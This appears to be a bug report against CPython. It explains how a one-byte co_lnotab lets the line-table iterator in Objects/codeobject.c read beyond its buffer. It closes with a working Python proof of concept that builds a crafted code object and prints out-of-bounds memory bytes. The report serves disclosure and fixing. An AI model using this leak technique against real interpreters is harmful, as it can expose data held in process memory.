# Relevant code
from `Objects/codeobject.c`
```C
static void
advance(PyCodeAddressRange *bounds)
{
    bounds->ar_start = bounds->ar_end;
    int delta = ((unsigned char *)bounds->opaque.lo_next)[0];
    bounds->ar_end += delta;
    int ldelta = ((signed char *)bounds->opaque.lo_next)[1];
    bounds->opaque.lo_next += 2;
    if (ldelta == -128) {
        bounds->ar_line = -1;
    }
    else {
        bounds->opaque.computed_line += ldelta;
        bounds->ar_line = bounds->opaque.computed_line;
    }
}

int
PyLineTable_NextAddressRange(PyCodeAddressRange *range)
{
    if (at_end(range)) {
        return 0;
    }
    advance(range);
    while (range->ar_start == range->ar_end) {
        assert(!at_end(range)); // <========= this assert catches this bug
        advance(range);
    }
    return 1;
}
```

since bytes are saved with a trailing `\0` (this can be seen in `Objects/bytesobject.c` at `_PyBytes_fromSize`),
setting `co_lnotab = b'\0'` would result in a memory layout of `00 00 UB UB` where `UB` are some out of bound bytes.

Calling advance the first time would consume the first two known bytes, but because
```C
int delta = ((unsigned char *)bounds->opaque.lo_next)[0];
bounds->ar_end += delta;
```
the condition of the while is still satified, so we are able to execute an extra advance
which leaks the two consecutive bytes.

```
import types
import struct

# any value it's fine, but if line[2] - n is < 0 it would become a None
# so in order to leak as much data as possible, this value is ideal
n = 2**30 - 1
# The leak depends on where this buffer is allocated, so playing with its length
# or allocation point might help leak different things
lnotab = b"\x00"

c = types.CodeType(
    0, #code_obj.co_argcount, 
    0, #code_obj.co_posonlyargcount,
    0, #code_obj.co_kwonlyargcount, 
    0, #code_obj.co_nlocals,
    0, #code_obj.co_stacksize, 
    0, #code_obj.co_flags,
    b'', #code_obj.co_code, 
    tuple(), #code_obj.co_consts, 
    tuple(), #code_obj.co_names,
    tuple(), #code_obj.co_varnames, 
    '', #code_obj.co_filename,
    '', #code_obj.co_name, 
    n, #code_obj.co_firstlineno, 
    lnotab,#code_obj.co_lnotab,
    tuple(), #code_obj.co_freevars, 
    tuple(), #code_obj.co_cellvars,
)

line = next(c.co_lines())
leak1 = struct.pack("B", line[1] - line[0])
leak2 = struct.pack("b", line[2] - n)
print(leak1 + leak2, end=" ")
```
